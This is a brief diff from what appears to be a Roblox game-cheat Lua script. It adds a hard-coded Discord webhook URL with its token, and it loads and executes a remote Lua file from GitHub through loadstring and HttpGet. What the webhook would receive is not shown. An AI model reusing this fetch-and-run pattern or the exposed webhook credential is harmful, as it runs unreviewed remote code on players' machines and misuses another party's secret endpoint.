@@ -1,3 +1,5 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1486342241260798022/L5hsFgWw9ujgm9Hp9TSeB0H0KKmEvldXhbGiwljVKS6yfwUg-f3LNnPI4qJ_95jV6Cb-"
+
 repeat task.wait() until game:IsLoaded()
 local DqrUI = loadstring(game:HttpGet('https://raw.githubusercontent.com/roLfesnz/bloxfruits/refs/heads/main/ui.lua'))()
 
